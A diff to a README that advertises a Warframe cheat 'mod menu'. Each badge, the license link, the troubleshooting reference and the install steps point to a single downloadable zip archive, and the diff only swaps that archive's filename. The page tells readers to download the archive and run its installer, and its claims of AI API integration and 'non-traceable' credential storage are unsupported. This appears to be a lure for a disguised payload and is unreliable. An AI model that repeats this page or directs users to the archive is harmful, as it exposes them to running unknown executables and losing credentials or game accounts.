@@ -1,15 +1,15 @@
 # Warframe Mod Menu 🚀
 
-[![Warframe Mod Menu Version](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)
-[![Stars](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)
-[![Downloads](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](#installation)
-[![MIT License](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](#-mit-license-2025)
-[![OpenAI API Ready](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](#-openai--claude-api-integration)
-[![Claude API Ready](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](#-openai--claude-api-integration)
+[![Warframe Mod Menu Version](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)
+[![Stars](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)
+[![Downloads](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](#installation)
+[![MIT License](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](#-mit-license-2025)
+[![OpenAI API Ready](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](#-openai--claude-api-integration)
+[![Claude API Ready](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](#-openai--claude-api-integration)
 
 ---
 
-![Download](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)[https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip](#installation)
+![Download](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)[https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip](#installation)
 
 Elevate your Warframe experience with the *Warframe Mod Menu*: a meticulously-crafted toolkit by gaming visionaries, designed to enhance gameplay, optimize UI responsiveness, and empower players with revolutionary feature sets. Bring the future of modding to your fingertips, in 2025 and beyond.
 
@@ -88,10 +88,10 @@ All API credentials are stored using encrypted, non-traceable protocols for maxi
 Getting started is as simple and graceful as a Tenno slide attack:
 
 1. **Download the Warframe Mod Menu package**
-   - Click here to download: https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip
+   - Click here to download: https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip
 2. **Or tap the "Download" badge for instant access**
 
-   [![Download](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)
+   [![Download](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)
 
 3. **Extract the contents** to your preferred folder.
 4. **Run the installer** (compatible on Windows, Linux, MacOS).
@@ -99,7 +99,7 @@ Getting started is as simple and graceful as a Tenno slide attack:
 6. **Configure your options**, connect OpenAI/Claude APIs, and shape your ideal gaming environment.
 7. Stay in sync with regular updates direct from our team—auto-update is enabled by default!
 
-*For troubleshooting, consult `https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip` or reach our 24/7 support squad via the in-menu help beacon.*
+*For troubleshooting, consult `https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip` or reach our 24/7 support squad via the in-menu help beacon.*
 
 ---
 
@@ -127,11 +127,11 @@ Use our "Aegis Compliance System" for safe, responsible modding—preserve your 
 ## 📜 **MIT License 2025**
 
 This project is licensed under the MIT License.  
-Read the full license text [here](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip).
+Read the full license text [here](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip).
 
 ---
 
-![Download](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip)[https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/mod-warframe-menu-plus-v3.2-alpha.2.zip](#installation)
+![Download](https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip)[https://raw.githubusercontent.com/Amine123-fd/warframe-mod-menu-plus/branch/photochrome/plus-warframe-menu-mod-3.3.zip](#installation)
 
 ---
 
